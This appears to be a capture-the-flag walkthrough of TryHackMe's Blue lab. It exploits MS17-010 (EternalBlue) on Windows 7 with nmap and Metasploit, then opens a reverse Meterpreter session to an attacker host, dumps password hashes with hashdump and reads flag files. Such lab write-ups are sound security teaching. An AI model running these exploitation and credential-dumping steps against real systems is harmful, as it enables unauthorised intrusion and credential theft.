TryHackMe – Blue (MS17-010) Walkthrough

⚠️ Disclaimer
This write-up is for educational purposes only and was performed in a controlled lab environment (TryHackMe). Do not attempt these techniques on systems you do not own or have explicit permission to test.

1. Initial Enumeration

A service and default script scan was performed against the target.

nmap -sV -sC TARGET_IP

Key Findings

SMB (445) open

NetBIOS services exposed

Target identified as Windows 7 Professional SP1

SMB message signing disabled

These findings suggested the target may be vulnerable to legacy SMB exploits.

2. SMB Vulnerability Enumeration

All SMB-related NSE scripts were executed:

nmap --script=smb* TARGET_IP


This revealed indicators consistent with MS17-010.

To confirm, a targeted vulnerability scan was run:

nmap --script=smb-vuln-ms17-010 TARGET_IP

Result

✅ Target confirmed vulnerable to MS17-010

CVE reference: CVE-2017-0143

Risk level: High

Exploitable via SMBv1

3. Exploitation with Metasploit

Metasploit Framework was launched:

msfconsole


The MS17-010 EternalBlue module was selected:

use exploit/windows/smb/ms17_010_eternalblue

Configuration
set RHOSTS TARGET_IP
set LHOST ATTACKER_IP
exploit

Outcome

Exploit executed successfully

Meterpreter session established

Target confirmed as Windows 7 x64

Session running with SYSTEM-level privileges

4. Post-Exploitation Enumeration

A shell was spawned from Meterpreter:

shell


Process enumeration confirmed SYSTEM access:

ps


Multiple core Windows processes were observed running under NT AUTHORITY\SYSTEM.

5. Credential Access

With elevated privileges, credential dumping was performed:

hashdump


Extracted hashes were cracked offline to recover user credentials.

⚠️ Hash values intentionally omitted.

6. File System Enumeration & Flags
Root Directory
cd C:\
dir


A flag file was discovered and read:

type flag1.txt


📌 Flag 1 obtained:

Windows Registry Hive Directory
cd C:\Windows\System32\config
dir


This directory contains sensitive registry hives such as:

SAM

SYSTEM

SECURITY

Another flag was located:

type flag2.txt


📌 Flag 2 obtained: 

7. Searching for Additional Flags

A recursive search was performed:

search -f flag*.txt


This revealed an additional flag file in a user directory:

type C:\Users\USERNAME\Documents\flag3.txt


📌 Final flag obtained: 
